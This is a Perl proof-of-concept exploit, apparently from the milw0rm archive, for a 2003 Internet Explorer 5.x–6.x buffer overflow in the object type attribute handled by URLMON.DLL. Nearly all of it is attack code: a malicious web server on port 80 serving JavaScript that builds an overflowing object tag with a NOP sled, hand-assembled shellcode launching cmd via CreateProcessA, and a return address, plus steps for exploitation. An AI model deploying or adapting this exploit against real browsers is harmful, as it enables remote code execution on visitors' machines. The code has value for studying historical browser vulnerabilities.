#!/usr/bin/perl

#
#  Proof of concept exploit on IE 5.x - 6.x by Alumni
#  IE-Object longtype dynamic call oferflow
#
#  url://<$shellcode><'/'x48><jmp %ptr_sh>
#  the flaw actually exists in URLMON.DLL when converting backslashes
#  to wide char, this can be seen on stack dump near '&CLSID=AAA...2F__2F__...'.
#	
#  To exploit:  i)  start server perl script;
#	     ii) connect to http-service using IE/5.x.
#                   a) the shellcode size is limited up to 56 bytes;
#	     b) the '$ret' may differ as well as the image base of KERNEL32.DLL;
#	     c) to avoid multiple encoding the shellcode is given 'as is' with help of JScript.
#

use IO::Socket;

$port = 80;
$server = IO::Socket::INET->new (LocalPort => $port,
				Type =>SOCK_STREAM,
				Reuse => 1,
				Listen => $port) or die("Couldnt't create 
server socket\n");


$shellcode = 	"\x33\xdb".		# xor ebx, ebx
		"\x8b\xd4".		# mov edx, esp
		"\x80\xc6\xff".		# add dh, 0xFF
		"\xc7\x42\xfc\x63\x6d".	# mov dword ptr[edx-4], 0x01646D63 
("cmd\x01")
		"\x64\x01".		#
		"\x88\x5a\xff".		# mov byte ptr[edx-1], bl
		"\x8d\x42\xfc".		# lea eax, [edx-4]
		"\x8b\xf5".		# mov esi, ebp
		"\x56\x52".		# push esi; push edx
		"\x53\x53\x53\x53\x53\x53".	# push ebx
		"\x50\x53".		# push eax; push ebx
		"\xb8\x41\x77\xf7\xbf".	# mov eax, 0xBFF77741 ~= 
CreateProcessA
		"\xff\xd0".		# call eax
		"\xb8\xf8\xd4\xf8\xbf".	# mov eax, 0xBFF8D4F8 ~= 
ExitProcess
		"\xff\xd0".		# call eax
		"\xcc";			# int 3

$nop = "\x90";
$ret = "\\xAB\\x5D\\x58";


while ($client = $server->accept()) {
	while (<$client>) {
		if ($_ =~ /^(\x0D\x0A)/) {

print $client <<END_DATA;
HTTP/1.0 200 Ok\r
Content-Type: text/html\r
\r
&lt;script&gt;\r
	var mins = 56;\r
	var size = 48;\r
	var sploit = "$shellcode";\r
	var strNop = "$nop";\r
	var strObj = '&lt;object type="';\r
	for (i=0;i<mins-sploit.length;i++) strObj += strNop;\r
	strObj += sploit;\r
	for (i=0;i<size;i++) strObj += '/';\r
	strObj += "CCCCCCCCDDDDDDDD";\r
	strObj += "$ret";\r
	strObj += '">Hello&lt;/object&gt;';\r
	alert(strObj);\r
	document.write(strObj);\r
&lt;/script&gt;\r
END_DATA
			close($client);

		}
	}
}

close($server);

# milw0rm.com [2003-06-07]
